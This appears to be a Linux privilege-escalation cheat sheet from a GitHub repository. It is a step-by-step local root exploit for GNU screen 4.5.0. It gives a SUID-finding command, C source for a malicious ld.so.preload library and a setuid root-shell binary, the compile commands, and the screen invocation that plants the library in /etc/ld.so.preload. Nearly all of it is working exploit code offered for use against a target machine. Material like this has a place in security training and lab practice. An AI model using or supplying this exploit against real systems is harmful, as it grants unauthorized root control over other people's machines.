```bash
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
```
![image](https://github.com/Grizzy529/Linux-PrivEsc/assets/102862377/ab99952d-a793-47a9-889f-b0cc5152ad2c)

* Compile First
- Save this file as `libhax.c`
```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

- Save this file as `rootshell.c`
```
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

- Let’s compile it

```
gcc -fPIC -shared -ldl -o libhax.so libhax.c
gcc --static -o rootshell rootshell.c
```

- Now we have both the file

1. Upload `libhax.so` and `rootshell` to target machine in `/tmp` directory
2. Also change the permission of both the file to executable
```
chmod +x rootshell
chmod +x libhax
```
4. Run Below Commands
```bash
cd /etc
umask 000
screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
/tmp/rootshell
id
```
![image](https://github.com/Grizzy529/Linux-PrivEsc/assets/102862377/7cad8e25-8076-4a96-9a7e-88499f9df884)
